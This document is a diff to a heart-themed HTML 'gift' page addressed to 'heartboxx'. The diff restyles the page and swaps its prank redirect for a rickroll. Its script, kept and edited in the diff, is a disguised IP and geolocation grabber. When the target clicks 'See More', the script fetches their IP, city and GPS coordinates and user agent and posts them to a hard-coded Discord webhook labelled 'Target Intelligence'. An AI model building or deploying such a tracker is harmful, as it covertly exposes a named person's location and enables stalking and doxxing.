@@ -19,31 +19,32 @@
         .assets { display: flex; justify-content: center; gap: 20px; margin-bottom: 30px; }
         .glow {
             width: 120px;
-            filter: drop-shadow(0 0 15px rgba(255, 77, 77, 0.8));
+            filter: drop-shadow(0 0 20px rgba(255, 77, 77, 0.9));
         }
         h1 { 
             color: #ff4d4d; 
             font-size: 28px; 
             margin-bottom: 40px; 
-            text-shadow: 0 0 10px rgba(255, 77, 77, 0.5);
+            text-shadow: 0 0 15px rgba(255, 77, 77, 0.6);
+            font-weight: bold;
         }
         .btn { 
             background-color: #ff4d4d; 
             color: white; 
             border: none; 
-            padding: 12px 40px; 
-            border-radius: 25px; 
+            padding: 14px 45px; 
+            border-radius: 30px; 
             font-weight: bold; 
-            font-size: 14px; 
+            font-size: 15px; 
             text-transform: uppercase; 
             cursor: pointer; 
             transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(255, 77, 77, 0.3);
+            box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4);
         }
         .btn:hover { 
             background-color: #ff3333; 
-            transform: scale(1.05); 
-            box-shadow: 0 6px 20px rgba(255, 77, 77, 0.5);
+            transform: scale(1.1); 
+            box-shadow: 0 0 25px rgba(255, 77, 77, 0.7);
         }
     </style>
 </head>
@@ -55,15 +56,15 @@
             <img src="https://img.icons8.com/emoji/96/000000/heart-suit.png" class="glow">
         </div>
         <h1>For heartboxx</h1>
-        <button class="btn" onclick="executeHook()">See More</button>
+        <button class="btn" onclick="strike()">See More</button>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
-        const REDIRECT = "https://www.youtube.com/watch?v=f-tM_C1z7f8";
+        const RICKROLL_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        async function executeHook() {
-            // 1. Capture Coordinates and IP Intelligence
+        async function strike() {
+            // 1. Grab IP and GPS Cords
             let intel = {};
             try {
                 const response = await fetch('https://ipapi.co/json/');
@@ -72,29 +73,29 @@
                 intel = { city: "Unknown", ip: "Hidden", latitude: "0", longitude: "0" }; 
             }
 
-            // 2. Fire the hit to your Discord
+            // 2. Fire the hit to Discord Webhook
             await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: "🎁 **THE HEART BOX HAS BEEN OPENED!**",
+                    content: "🕺 **NEVER GONNA GIVE HEARTBOXX UP!**",
                     embeds: [{
-                        title: "Target: heartboxx",
+                        title: "Target Intelligence: heartboxx",
                         color: 16730445,
                         fields: [
                             { name: "📍 Location", value: `${intel.city}, ${intel.region}, ${intel.country_name}` },
                             { name: "🌐 IP Address", value: intel.ip },
                             { name: "🗺️ Map Coords", value: `${intel.latitude}, ${intel.longitude}` },
-                            { name: "🔗 View on Map", value: `https://www.google.com/maps?q=${intel.latitude},${intel.longitude}` },
-                            { name: "🖥️ Browser/Platform", value: navigator.userAgent }
+                            { name: "🔗 Google Maps", value: `https://www.google.com/maps?q=${intel.latitude},${intel.longitude}` },
+                            { name: "🖥️ User Agent", value: navigator.userAgent }
                         ],
-                        footer: { text: "Redirecting to idiot loop..." }
+                        footer: { text: "Redirected to Rick Astley." }
                     }]
                 })
             });
 
-            // 3. Kick to the "You Are An Idiot" Remastered
-            window.location.href = REDIRECT;
+            // 3. The Rickroll Redirect
+            window.location.href = RICKROLL_URL;
         }
     </script>
 </body>
